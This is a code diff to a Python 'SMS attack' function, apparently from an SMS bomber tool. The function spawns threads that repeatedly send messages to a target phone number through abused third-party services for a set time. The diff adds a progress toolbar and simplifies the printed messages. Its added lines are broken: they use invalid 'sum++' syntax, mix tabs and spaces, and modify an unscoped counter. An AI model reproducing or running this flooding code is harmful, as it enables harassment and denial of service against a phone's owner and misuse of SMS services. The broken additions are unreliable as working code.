@@ -28,6 +28,7 @@ from threading import Thread
 import sendRequest as request
 import numberTools as number
 import randomData  as randomData
+import toolbar
 
 def SMS_ATTACK(threads, attack_time, phone):
 	# Finish
@@ -35,36 +36,32 @@ def SMS_ATTACK(threads, attack_time, phone):
 	FINISH = False
 	threads_list = []
 
-	# Get services list
 	services = request.getServices()
-	# Make for Russian numbers
 	phone = number.normalize(phone)
-	# Get country name by phone
 	country = number.getCountry(phone)
-	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting SMS attack...")
+	print("Starting attack...")
 
-	# Send SMS
+        sum = 0
 	def sms_flood():
 		while not FINISH:
+                        sum++
+                        toolbar.update_progress(sum)
 			service = randomData.random_service(services)
 			service = request.Service(service)
 			service.sendMessage(phone)
+                toolbar.update_progress(100/100.0)
 
-
-	# Start threads
 	for thread in range(threads):
-		print("\033[1;34m"+"[*]"+"\033[0m"+" Starting thread " + str(thread) + "...")
+		print("Starting threads...")
 		t = Thread(target = sms_flood)
 		t.start()
 		threads_list.append(t)
-	# Sleep selected secounds
 	try:
 		time.sleep(attack_time)
 	except KeyboardInterrupt:
 		FINISH = True
-	# Terminate threads
 	for thread in threads_list:
 		FINISH = True
 		thread.join()
 	
-	print("\033[1;33m"+"[!]"+"\033[0m"+" SMS attack completed.")
+	print("Attack completed.")
